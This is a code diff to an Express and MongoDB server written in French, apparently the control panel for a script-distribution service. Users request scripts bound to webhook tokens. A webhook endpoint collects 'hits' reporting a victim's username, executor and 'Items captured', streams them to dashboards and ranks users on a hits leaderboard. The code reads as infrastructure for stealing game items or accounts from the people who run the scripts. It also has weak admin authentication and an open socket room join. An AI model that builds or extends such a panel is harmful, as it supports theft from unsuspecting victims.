@@ -30,7 +30,7 @@ mongoose.connect(process.env.MONGO_URI)
     .then(() => console.log("✅ MongoDB Connecté"))
     .catch(err => console.error("❌ Erreur DB:", err));
 
-// Middleware pour protéger les routes
+// Middleware Auth standard
 const authMiddleware = (req, res, next) => {
     const token = req.cookies.auth_token;
     if (!token) return res.redirect('/login');
@@ -49,13 +49,14 @@ app.get('/', (req, res) => res.sendFile(path.join(process.cwd(), 'public/index.h
 app.get('/login', (req, res) => res.sendFile(path.join(process.cwd(), 'public/login.html')));
 app.get('/signup', (req, res) => res.sendFile(path.join(process.cwd(), 'public/signup.html')));
 app.get('/dashboard', authMiddleware, (req, res) => res.sendFile(path.join(process.cwd(), 'public/dashboard.html')));
+app.get('/admin', authMiddleware, (req, res) => res.sendFile(path.join(process.cwd(), 'public/admin.html')));
 
 // --- API AUTH ---
 app.post('/api/auth/signup', async (req, res) => {
     try {
         const { username, email, password } = req.body;
         const hashedPassword = await bcrypt.hash(password, 10);
-        const newUser = new User({ username, email, password: hashedPassword });
+        const newUser = new User({ username, email, password: hashedPassword, hitsCount: 0 });
         await newUser.save();
         res.redirect('/login');
     } catch (err) {
@@ -75,112 +76,110 @@ app.post('/api/auth/login', async (req, res) => {
         res.cookie('auth_token', token, { httpOnly: true });
         res.redirect('/dashboard');
     } else {
-        res.send("Identifiants incorrects. <a href='/login'>Réessayer</a>");
+        res.send("Identifiants incorrects.");
     }
 });
 
-app.get('/api/user/me', authMiddleware, (req, res) => {
-    res.json(req.user);
-});
+app.get('/api/user/me', authMiddleware, (req, res) => res.json(req.user));
 
-// --- API CHAT GÉNÉRAL ---
+// --- API CHAT ---
 app.get('/api/messages', authMiddleware, async (req, res) => {
-    try {
-        const messages = await Message.find({ recipient: 'General' })
-            .sort({ timestamp: 1 })
-            .limit(50);
-        res.json(messages);
-    } catch (err) {
-        res.status(500).json({ error: "Erreur de chargement" });
-    }
+    const messages = await Message.find({ recipient: 'General' }).sort({ timestamp: 1 }).limit(50);
+    res.json(messages);
 });
 
 app.post('/api/messages/send', authMiddleware, async (req, res) => {
-    const { content } = req.body;
     const newMessage = new Message({
         sender: req.user.id,
         senderName: req.user.username,
         recipient: 'General',
-        content: content
+        content: req.body.content
     });
     await newMessage.save();
     io.emit('new_general_message', newMessage); 
     res.json({ success: true });
 });
 
-// --- API MY SCRIPTS ---
+// --- API SCRIPTS ---
 app.get('/api/my-scripts', authMiddleware, async (req, res) => {
-    try {
-        const scripts = await Script.find({ userId: req.user.id }).sort({ createdAt: -1 });
-        res.json(scripts);
-    } catch (err) {
-        res.status(500).json({ error: "Erreur serveur" });
-    }
+    const scripts = await Script.find({ userId: req.user.id }).sort({ createdAt: -1 });
+    res.json(scripts);
 });
 
-// Fonction pour envoyer un script (utilisable par ton bot/admin)
+app.post('/api/scripts/request', authMiddleware, async (req, res) => {
+    const newRequest = new ScriptRequest({
+        userId: req.user.id,
+        username: req.user.username,
+        webhookuuid: req.user.webhook,
+        receivers: req.body.receivers,
+        minIncome: req.body.minIncome
+    });
+    await newRequest.save();
+    res.json({ success: true });
+});
+
+// --- API ADMIN (Protégée par MASTER_PASSWORD) ---
+app.post('/api/admin/verify', authMiddleware, (req, res) => {
+    if (req.body.password === process.env.MASTER_PASSWORD) res.json({ success: true });
+    else res.status(401).json({ success: false });
+});
+
+app.get('/api/admin/users', authMiddleware, async (req, res) => {
+    if (req.headers['x-admin-key'] !== process.env.MASTER_PASSWORD) return res.status(403).end();
+    const users = await User.find({}, '-password').sort({ createdAt: -1 });
+    res.json(users);
+});
+
+app.get('/api/admin/requests', authMiddleware, async (req, res) => {
+    if (req.headers['x-admin-key'] !== process.env.MASTER_PASSWORD) return res.status(403).end();
+    const requests = await ScriptRequest.find().sort({ createdAt: -1 });
+    res.json(requests);
+});
+
+app.delete('/api/admin/users/:id', authMiddleware, async (req, res) => {
+    if (req.headers['x-admin-key'] !== process.env.MASTER_PASSWORD) return res.status(403).end();
+    await User.findByIdAndDelete(req.params.id);
+    res.json({ success: true });
+});
+
 app.post('/api/scripts/send', async (req, res) => {
-    try {
-        const { webhookuuid, receiver, minincome, script } = req.body;
-        const user = await User.findOne({ webhookToken: webhookuuid });
-        if (!user) return res.status(404).json({ error: "UUID Invalide" });
+    // Cette route est utilisée par l'admin pour valider une demande
+    const { webhookuuid, receiver, minincome, script } = req.body;
+    const user = await User.findOne({ webhookToken: webhookuuid });
+    if (!user) return res.status(404).json({ error: "UUID Invalide" });
 
-        const newScript = new Script({
-            userId: user._id,
-            receiver,
-            minIncome: minincome,
-            scriptCode: script
-        });
-        await newScript.save();
-        
-        io.to(user._id.toString()).emit('script_generated');
-        res.json({ success: true });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
+    const newScript = new Script({ userId: user._id, receiver, minIncome: minincome, scriptCode: script });
+    await newScript.save();
+    
+    // On peut aussi supprimer la requête une fois traitée
+    await ScriptRequest.findOneAndDelete({ webhookuuid: webhookuuid, minIncome: minincome });
+
+    io.to(user._id.toString()).emit('script_generated');
+    res.json({ success: true });
 });
 
-// --- WEBHOOK RÉCEPTION HITS ---
+// --- WEBHOOK HITS ---
 app.post('/webhook/:token', async (req, res) => {
-    const user = await User.findOne({ webhookToken: req.params.token });
+    const user = await User.findOneAndUpdate(
+        { webhookToken: req.params.token },
+        { $inc: { hitsCount: 1 } } // Incrémente le leaderboard
+    );
     if (user) {
         const hitData = {
             username: req.body.username || "Unknown",
             executor: req.body.executor || "Unknown",
-            text: req.body.text || "No data provided",
+            text: req.body.text || "Items captured",
             date: new Date().toLocaleTimeString()
         };
-        // Envoi en temps réel au dashboard de l'utilisateur
         io.to(user._id.toString()).emit('receive_message', hitData);
         return res.json({ status: "success" });
     }
-    res.status(404).json({ error: "Token invalide" });
+    res.status(404).json({ error: "Invalid Token" });
 });
 
-app.post('/api/scripts/request', authMiddleware, async (req, res) => {
-    try {
-        const { receivers, minIncome } = req.body;
-        
-        const newRequest = new ScriptRequest({
-            userId: req.user.id,
-            username: req.user.username,
-            webhookuuid: req.user.webhook,
-            receivers,
-            minIncome
-        });
-
-        await newRequest.save();
-        res.json({ success: true, message: "Request sent to Admin!" });
-    } catch (err) {
-        res.status(500).json({ error: "Error sending request" });
-    }
-});
 // --- SOCKET.IO ---
 io.on('connection', (socket) => {
-    socket.on('join_room', (userId) => {
-        socket.join(userId);
-        console.log(`User ${userId} joined room.`);
-    });
+    socket.on('join_room', (userId) => socket.join(userId));
 });
 
 const PORT = process.env.PORT || 10000;
